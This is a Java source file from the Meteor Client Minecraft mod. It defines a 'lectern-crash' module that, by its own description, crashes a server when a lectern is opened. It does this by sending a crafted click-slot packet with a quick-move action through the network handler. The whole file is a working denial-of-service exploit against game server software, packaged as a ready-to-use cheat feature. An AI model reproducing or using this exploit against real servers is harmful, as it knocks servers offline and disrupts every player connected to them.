/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client/).
 * Copyright (c) 2022 Meteor Development.
 */

package meteordevelopment.meteorclient.systems.modules.misc;

import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.network.MeteorExecutor;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;

public class LecternCrash extends Module {

    public LecternCrash() { super(Categories.Misc, "lectern-crash", "Allows you to crash the server when a lectern is opened."); }

    public void crash() {
        MeteorExecutor.execute(() -> {
            if (mc.getNetworkHandler() == null || mc.player == null) return;
            ClickSlotC2SPacket packet = new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId, mc.player.currentScreenHandler.getRevision(), 0, 0, SlotActionType.QUICK_MOVE, mc.player.currentScreenHandler.getCursorStack().copy(), Int2ObjectMaps.emptyMap());
            mc.getNetworkHandler().sendPacket(packet);
        });
    }
}

